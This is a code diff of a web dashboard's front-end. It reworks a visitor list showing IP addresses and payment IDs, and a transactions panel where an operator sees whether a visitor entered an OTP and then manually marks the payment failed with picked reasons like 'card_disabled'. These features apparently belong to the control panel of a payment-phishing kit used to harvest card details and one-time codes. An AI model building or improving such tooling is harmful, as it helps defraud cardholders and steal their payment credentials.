@@ -103,6 +103,8 @@
       align-items: center;
       padding: 10px;
       border-bottom: 1px solid #333;
+    }
+    .visitor-item.new {
       animation: highlight 3s ease-out;
     }
     .visitor-badge {
@@ -246,6 +248,97 @@
       }, duration);
     }
 
+    // Load visitors
+    async function loadVisitors() {
+      try {
+        console.log('Loading visitors from server...');
+        const response = await fetch('/api/visitors');
+        
+        if (!response.ok) {
+          throw new Error(`Failed to load visitors: ${response.status}`);
+        }
+        
+        const data = await response.json();
+        console.log('Visitor data received:', data);
+        
+        updateVisitorsList(data);
+      } catch (error) {
+        console.error('Error loading visitors:', error);
+      }
+    }
+
+    // Update visitors list
+    function updateVisitorsList(visitors) {
+      const visitorsList = document.getElementById('visitors-list');
+      
+      // Clear existing list first
+      visitorsList.innerHTML = '';
+      
+      if (!visitors || visitors.length === 0) {
+        visitorsList.innerHTML = '<p>No visitors yet</p>';
+        return;
+      }
+      
+      // Sort visitors by timestamp (newest first)
+      visitors.sort((a, b) => {
+        return new Date(b.timestamp) - new Date(a.timestamp);
+      });
+      
+      // Add each visitor to the list
+      visitors.forEach(visitor => {
+        // Store in map for reference
+        visitorsMap.set(visitor.pid, visitor);
+        
+        // Add to DOM
+        addVisitorToList(visitor, false);
+      });
+      
+      console.log(`Updated visitors list with ${visitors.length} visitors`);
+    }
+
+    // Add visitor to list
+    function addVisitorToList(visitor, isNew = true) {
+      if (!visitor || !visitor.pid) {
+        console.error('Invalid visitor data:', visitor);
+        return;
+      }
+      
+      const visitorsList = document.getElementById('visitors-list');
+      
+      // Check if this visitor is already in the list
+      const existingItem = document.getElementById(`visitor-${visitor.pid}`);
+      if (existingItem && !isNew) {
+        return; // Skip if already exists and not new
+      }
+      
+      // Create visitor item
+      const visitorItem = document.createElement('div');
+      visitorItem.className = isNew ? 'visitor-item new' : 'visitor-item';
+      visitorItem.id = `visitor-${visitor.pid}`;
+      
+      visitorItem.innerHTML = `
+        <span class="visitor-badge">VISITOR</span>
+        <span class="ip-address">${visitor.ip || 'Unknown'}</span>
+        <span>Payment ID: ${visitor.pid}</span>
+        <span class="visitor-time">${visitor.timestamp}</span>
+      `;
+      
+      // Add to list (at beginning for new visitors)
+      if (isNew && visitorsList.firstChild) {
+        visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
+        console.log('Added new visitor to top of list:', visitor.pid);
+      } else {
+        visitorsList.appendChild(visitorItem);
+        console.log('Added visitor to list:', visitor.pid);
+      }
+      
+      // Remove "No visitors yet" message if present
+      const noVisitorsMsg = visitorsList.querySelector('p');
+      if (noVisitorsMsg && noVisitorsMsg.textContent === 'No visitors yet') {
+        noVisitorsMsg.remove();
+      }
+    }
+
     // Payment Link Generation
     document.getElementById('generateBtn').addEventListener('click', async () => {
       const amountInput = document.getElementById('amount');
@@ -314,58 +407,6 @@
           showMessage('error', 'Failed to copy link');
         });
     });
-
-    // Load visitors
-    async function loadVisitors() {
-      try {
-        const response = await fetch('/api/visitors');
-        if (!response.ok) {
-          throw new Error('Failed to load visitors');
-        }
-        
-        const data = await response.json();
-        console.log('Loaded visitors:', data);
-        
-        const visitorsList = document.getElementById('visitors-list');
-        
-        if (!data || data.length === 0) {
-          visitorsList.innerHTML = '<p>No visitors yet</p>';
-          return;
-        }
-        
-        visitorsList.innerHTML = '';
-        data.forEach(visitor => {
-          visitorsMap.set(visitor.pid, visitor);
-          addVisitorToList(visitor, false);
-        });
-      } catch (error) {
-        console.error('Error loading visitors:', error);
-      }
-    }
-    
-    // Add visitor to list
-    function addVisitorToList(visitor, isNew = true) {
-      const visitorsList = document.getElementById('visitors-list');
-      const visitorItem = document.createElement('div');
-      visitorItem.className = 'visitor-item';
-      if (isNew) {
-        visitorItem.style.animation = 'highlight 3s ease-out';
-      }
-      
-      visitorItem.innerHTML = `
-        <span class="visitor-badge">VISITOR</span>
-        <span class="ip-address">${visitor.ip || 'Unknown'}</span>
-        <span>Payment ID: ${visitor.pid}</span>
-        <span class="visitor-time">${visitor.timestamp}</span>
-      `;
-      
-      // Add to beginning of list for new visitors
-      if (isNew) {
-        visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
-      } else {
-        visitorsList.appendChild(visitorItem);
-      }
-    }
 
     // Transactions Handling
     async function loadTransactions() {
@@ -437,7 +478,7 @@
                     <option value="card_disabled" ${tx.failureReason === 'card_disabled' ? 'selected' : ''}>Card Disabled</option>
                     <option value="invalid_card" ${tx.failureReason === 'invalid_card' ? 'selected' : ''}>Invalid Card</option>
                   </select>
-             <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
+                  <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
                     class="fail-btn">
                     Fail
                   </button>
@@ -645,13 +686,22 @@
         console.log('Could not play notification sound', e);
       }
     });
+    
+    // Handle existing visitors when reconnecting
+    socket.on('existing_visitors', (visitors) => {
+      console.log('Received existing visitors:', visitors);
+      updateVisitorsList(visitors);
+    });
 
     // Initial Load
     document.addEventListener('DOMContentLoaded', () => {
-      loadTransactions();
+      console.log('DOM loaded, initializing visitor tracking');
       loadVisitors();
+      loadTransactions();
+      
+      // Set up refresh intervals
+      setInterval(loadVisitors, 10000); // Check for visitors every 10 seconds
       setInterval(loadTransactions, 10000); // Refresh transactions every 10 seconds
-      setInterval(loadVisitors, 30000); // Refresh visitors every 30 seconds
     });
   </script>
 </body>
